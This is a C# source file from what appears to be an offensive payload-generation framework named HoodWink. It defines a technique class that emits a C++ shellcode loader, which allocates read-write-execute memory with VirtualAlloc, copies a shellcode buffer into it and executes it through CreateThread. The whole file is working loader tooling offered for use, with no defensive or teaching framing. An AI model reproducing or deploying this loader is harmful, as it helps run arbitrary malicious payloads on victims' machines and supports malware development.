using System.Collections.Generic;

namespace HoodWink.Languages.Cpp.Techniques
{
    public class Inline_NewThread : Models.Base.Technique
    {
        public override string Description => "Uses VirtualAlloc & CreateThread";
        public override List<string> FileDependencies => new List<string> { @"" };

        public override string Using => @"#include <Windows.h>
#include <iostream>";

        public override string ApiImports => @"";

        public override string MainLogic => @"// Technique
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);";

        public override string AdditionalFunctions => @"";
    }
}
